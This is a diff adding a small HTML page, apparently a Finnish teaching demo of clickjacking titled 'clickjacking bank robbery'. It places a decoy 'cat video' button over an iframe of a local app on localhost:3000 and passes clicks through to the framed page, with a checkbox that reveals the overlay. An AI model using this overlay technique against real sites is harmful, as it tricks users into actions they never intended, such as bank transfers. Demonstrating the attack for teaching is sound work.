@@ -1,0 +1,41 @@
+<!doctype html>
+<head>
+  <meta charset="UTF-8">
+  <title>Clickjacking-pankkiryöstö</title>
+  <style>
+#pahis {
+  position: absolute;
+  left: 0px;
+  top: 60px;
+  background: yellow;
+  width: 400px;
+  height: 200px;
+  pointer-events: none;
+}
+
+#pahis button {
+  position: relative;
+  left: 20px;
+  top: 112px;
+  pointer-events: none;
+}
+</style>
+<script>
+var seeThrough = false;
+function toggleOpacity() {
+  seeThrough = !seeThrough;
+  document.getElementById('pahis').style.opacity = seeThrough ? 0.5 : 1;
+}
+</script>
+</head>
+<body style="background: lightpink">
+  <h2>Clickjacking-pankkiryöstö</h2>
+  <div id="pahis">
+    <button>Kissavideo</button>
+  </div>
+  <iframe height="185" src="http://localhost:3000/"></iframe>
+  <div>
+    Paljasta: <input onclick="toggleOpacity()" type="checkbox" />
+  </div>
+</body>
+</html>
